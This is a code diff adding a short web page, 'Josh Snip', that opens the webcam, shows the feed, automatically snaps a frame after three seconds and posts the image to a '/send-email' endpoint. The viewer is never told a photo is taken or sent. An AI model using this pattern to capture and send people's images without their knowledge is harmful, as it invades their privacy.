@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Josh Snip</title>
+</head>
+<body>
+  <h1>Josh Snip 📸</h1>
+  <video id="video" autoplay></video>
+  <script>
+    const video = document.getElementById('video');
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => { video.srcObject = stream; });
+
+    setTimeout(() => {
+      let canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      let ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0);
+      let image = canvas.toDataURL('image/png');
+
+      fetch('/send-email', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ image })
+      });
+    }, 3000); // snap after 3 seconds
+  </script>
+</body>
+</html>
